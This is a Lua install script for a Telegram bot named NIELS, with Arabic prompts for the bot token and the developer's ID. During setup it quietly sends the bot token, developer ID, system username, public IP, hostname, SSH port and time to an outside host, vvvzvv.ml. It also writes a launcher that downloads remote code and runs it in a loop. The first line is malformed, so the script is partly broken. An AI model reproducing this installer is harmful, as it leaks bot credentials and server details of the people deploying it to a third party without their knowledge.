bot_id.. = dofile("./library/redis.lua").connect("127.0.0.1", 6379)
https = require ("ssl.https") 
serpent = dofile("./library/serpent.lua") 
json = dofile("./library/JSON.lua") 
JSON  = dofile("./library/dkjson.lua")
URL = require('socket.url')  
http = require("socket.http")
Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
local AutoFiles_Write = function() 
local Create_Info = function(Token,Sudo,user)  
local Write_Info_Sudo = io.open("Info.lua", 'w')
Write_Info_Sudo:write([[

token = "]]..Token..[["
SUDO = ]]..Sudo..[[  
UserName = "]]..user..[["

]])
Write_Info_Sudo:close()
end  
if not database:get(Server_Done.."Token_Write") then
print('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27')
local token = io.read()
if token ~= '' then
data,res = https.request("https://vvvzvv.ml/index/NIELS.php?p=NIELSTEAM")
if res == 200 then
tr = json:decode(data)
if tr.Info.info == 'Is_Spam' then
io.write('\n\27[1;31m'..tr.Info.info..'\n\27[0;39;49m')
os.execute('lua install.lua')
end 
if tr.Info.info == 'Ok' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
database:set(Server_Done.."Token_Write",token)
end 
end  
else
io.write('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua install.lua')
end 
end
if not database:get(Server_Done.."UserSudo_Write") then
print('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
local Id = io.read():gsub(' ','') 
if tostring(Id):match('%d+') then
data,res = https.request("https://vvvzvv.ml/index/NIELS.php?bn=info&id="..Id)
if res == 200 then
muaed = json:decode(data)
if muaed.Info.info == 'Is_Spam' then
io.write('\n\27[1;35m عذرا الايدي محظور من السورس \n\27[0;39;49m') 
os.execute('lua start.lua')
end 
if muaed.Info.info == 'Ok' then
io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
database:set(Server_Done.."UserSudo_Write",Id)
end 
else
io.write('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end
os.execute('lua install.lua')
end 
end
if not database:get(Server_Done.."User_Write") then
print('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
local User = io.read():gsub('@','') 
if User ~= '' then
io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
database:set(Server_Done.."User_Write",User)
else
io.write('\n\27[1;34m لم يتم حفظ معرف المطور :')
end
os.execute('lua install.lua')
end
local function Files_Info_Get()
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
http.request("https://vvvzvv.ml/index/NIELS.php?n=NIELSTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
local RunBot = io.open("NIELS", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/NIELS
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr NIELS.lua
wget "https://raw.githubusercontent.com/NIELS-TEAM/NIELS/main/NIELS.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./NIELS.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
local RunTs = io.open("Run", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/NIELS
while(true) do
rm -fr ../.telegram-cli
screen -S NIELS -X kill
screen -S NIELS ./NIELS
done
]])
RunTs:close()
end
Files_Info_Get()
database:del(Server_Done.."User_Write");database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
sudos = dofile('Info.lua')
os.execute('./install.sh ok')
end 
local function Load_File()  
local f = io.open("./Info.lua", "r")  
if not f then   
AutoFiles_Write()  
var = true
else   
f:close()  
database:del(Server_Done.."User_Write");database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
sudos = dofile('Info.lua')
os.execute('./install.sh ok')
var = false
end  
return var
end
Load_File()
